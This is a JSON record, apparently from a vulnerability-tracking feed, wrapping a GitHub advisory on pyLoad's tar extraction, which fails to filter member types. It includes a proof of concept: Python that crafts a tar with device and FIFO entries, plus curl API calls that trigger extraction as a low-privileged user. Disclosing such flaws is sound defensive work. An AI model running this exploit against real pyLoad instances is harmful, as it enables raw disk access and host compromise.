@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 0, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/298925831?v=4\", \"events_url\": \"https://api.github.com/users/skeletonsec/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/skeletonsec/followers\", \"following_url\": \"https://api.github.com/users/skeletonsec/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/skeletonsec/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/skeletonsec\", \"id\": 298925831, \"login\": \"skeletonsec\", \"node_id\": \"U_kgDOEdE_Bw\", \"organizations_url\": \"https://api.github.com/users/skeletonsec/orgs\", \"received_events_url\": \"https://api.github.com/users/skeletonsec/received_events\", \"repos_url\": \"https://api.github.com/users/skeletonsec/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/skeletonsec/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/skeletonsec/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/skeletonsec\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\n`UnTar._safe_extractall` — the hardening added for GHSA-mvwx-582f-56r7 — validates member\\n**names** and symlink/hardlink **targets**, but never checks member **types**, and calls\\n`tarfile.extractall` without a `filter=`. On Python < 3.14 the default extraction filter is\\n`fully_trusted`, so a crafted tar containing device or FIFO entries makes pyLoad create\\nthem on disk. When pyLoad runs as root (the official Docker deployment), a block-device\\nmember grants raw disk access — full host compromise — reachable by any low-privileged user\\nwho can trigger archive extraction (ADD to supply an archive, STATUS to invoke\\n`ExtractArchive.extract_package`).\\n\\n### Details\\n\\n```python\\n# plugins/extractors/UnTar.py:69-79\\nfor member in tar.getmembers():\\n    if not is_within_directory(...) or <symlink/hardlink target checks>:   # names/links only\\n        raise ArchiveError(...)\\ntar.extractall(path, members, numeric_owner=numeric_owner)   # no filter=\\n```\\n\\nNo `member.isdev()` / `ischr()` / `isblk()` / `isfifo()` check exists, and the pre-validation\\nin `plugins/base/extractor.py:191-263` is likewise name-only. Python's tarfile only defaults\\nto a safe filter in 3.14; supported runtimes (3.9–3.13) honor `mknod` for euid=0 and create\\nFIFOs for any euid.\\n\\n### PoC\\n\\n```bash\\nBASE=http://127.0.0.1:8100\\n# craft a tar with: regular marker.txt + a CHRTYPE member (major=1,minor=3) + a FIFOTYPE member\\npython3 - <<'EOF'\\nimport tarfile, io\\nt = tarfile.open('dev.bin','w')          # name it *.bin so UnTar (content-sniffed) claims it\\nt.addfile(tarfile.TarInfo('marker.txt'), io.BytesIO(b'MARKER'))\\ni = tarfile.TarInfo('nulldev'); i.type = tarfile.CHRTYPE; i.devmajor=1; i.devminor=3; i.mode=0o666\\nt.addfile(i)\\nf = tarfile.TarInfo('pipe'); f.type = tarfile.FIFOTYPE\\nt.addfile(f); t.close()\\nEOF\\n\\n# as a low-priv user (ADD|STATUS): add a package, place the archive in its download folder,\\n# then trigger extraction\\ncurl -s -X POST \\\"$BASE/api/add_package\\\" -b ed.jar -H \\\"X-CSRFToken: $T\\\" \\\\\\n  -H 'Content-Type: application/json' -d '{\\\"name\\\":\\\"poc\\\",\\\"links\\\":[\\\"http://x/dev.bin\\\"],\\\"dest\\\":1}'\\ncurl -s -X POST \\\"$BASE/api/service_call\\\" -b ed.jar -H \\\"X-CSRFToken: $T\\\" \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"service_name\\\":\\\"ExtractArchive.extract_package\\\",\\\"arguments\\\":[\\\"<pid>\\\"]}'\\n\\nls -l <extract dir>\\n# → crw-rw-rw- 1 root root 1, 3 nulldev      (character device created)\\n# → prw-r--r-- 1 root root     pipe          (FIFO created)\\n# → -rw-r--r-- 1 root root     marker.txt\\n```\\n\\nNegative control: the same flow with a `../evil` traversal member is rejected\\n(`ArchiveError: Attempted path traversal in archive`) and nothing is extracted — the\\nGHSA-mvwx name filter works; the gap is member-**type**-specific. (Note: when the 7z binary\\nis present, `.tar`-named files are claimed by SevenZip first by extension; the UnTar path is\\nreached via non-mapped names — as above — content-sniffed containers, or when 7z is\\nabsent/fails.)\\n\\n### Impact\\n\\nWith pyLoad as root, a crafted archive can create block/character device nodes at arbitrary\\npaths (raw disk read/write → host compromise), plant FIFOs (process hangs, IPC confusion),\\nor set special bits; non-root deployments still get FIFOs and node entries in\\nuser-accessible trees.\\n\\n### Remediation\\n\\nIn `_safe_extractall`, reject (or skip) every member that is not a regular file, directory,\\nor safe link — e.g. `member.isdev() or isfifo()` → `ArchiveError` — and pass\\n`filter=\\\"data\\\"` (Python ≥ 3.12 supports it; backport the check for older runtimes). Apply\\nthe same member-type validation in the pre-extraction validator so all extractors share it.\\n\\n### References\\n\\n- GHSA-mvwx-582f-56r7 — the tar path-traversal fix this extends (names/links validated,\\n  member types not).\", \"ghsa_id\": \"GHSA-fr26-jjhm-638c\", \"github_reviewed_at\": \"2026-10-09T17:08:58Z\", \"html_url\": \"https://github.com/advisories/GHSA-fr26-jjhm-638c\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fr26-jjhm-638c\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-09T17:08:58Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-fr26-jjhm-638c\", \"https://github.com/pyload/pyload/commit/09eec1b431b6942a1917f094f2c77bfbf5637f60\", \"https://github.com/advisories/GHSA-fr26-jjhm-638c\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-fr26-jjhm-638c\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"pyLoad: Tar extraction creates device nodes and FIFOs (member types not filtered; tarfile extractall without filter=)\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-09T17:08:59Z\", \"url\": \"https://api.github.com/advisories/GHSA-fr26-jjhm-638c\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.5.0b3.dev101\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fr26-jjhm-638c",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: <= 0.5.0b3.dev101"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.279315Z",
+  "provenance": {
+    "content_sha256": "c0da59d0df74d7755361d798dadb3dcd351732ff1872fd0a2d5ce683cd409c01",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-09T17:08:58Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fr26-jjhm-638c",
+  "status": "active",
+  "title": "pyLoad: Tar extraction creates device nodes and FIFOs (member types not filtered; tarfile extractall without filter=)",
+  "updated_at": "2026-10-09T17:08:59Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fr26-jjhm-638c"
+}
